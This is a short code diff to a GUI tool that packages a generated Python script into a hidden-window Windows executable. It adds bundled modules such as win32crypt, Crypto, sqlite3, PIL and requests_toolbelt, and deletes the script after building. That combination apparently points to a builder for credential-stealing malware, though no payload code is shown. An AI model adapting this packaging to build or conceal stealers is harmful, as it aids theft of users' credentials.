@@ -444,7 +444,19 @@ class App(customtkinter.CTk):
                 f"{filename}.py",
                 "--target-name", filename,
                 "--base-name", "Win32GUI",
-                "--include-modules", "json"
+                "--includes", "base64",
+                "--includes", "ctypes",
+                "--includes", "json",
+                "--includes", "re",
+                "--includes", "time",
+                "--includes", "subprocess",
+                "--includes", "sys",
+                "--includes", "sqlite3",
+                "--includes", "requests_toolbelt",
+                "--includes", "psutil",
+                "--includes", "PIL",
+                "--includes", "Crypto",
+                "--includes", "win32crypt"
             ]
             if exeicon != "NONE":
                 cmd_args += ["--icon", exeicon]
@@ -516,6 +528,7 @@ class App(customtkinter.CTk):
 
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button)
+            os.remove(f"./{filename}.py")
 
 
 if __name__ == "__main__":
